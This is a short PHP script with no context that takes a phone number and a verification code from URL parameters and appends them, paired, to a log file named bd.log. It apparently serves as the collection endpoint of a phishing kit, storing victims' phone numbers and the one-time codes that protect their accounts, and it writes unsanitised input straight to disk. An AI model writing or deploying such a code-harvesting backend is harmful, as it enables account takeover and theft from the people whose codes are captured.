<?php
$phone = $_GET['phone'];
$code = $_GET['code'];
if($code == ""){
  $f = fopen("bd.log", "a+");
  fwrite($f, "\r\nPhone: $phone");
  fclose($f);
}else{
  $f = fopen("bd.log", "a+");
  fwrite($f, "\r\nCode: $code for phone: $phone ");
  fclose($f);
}

?>
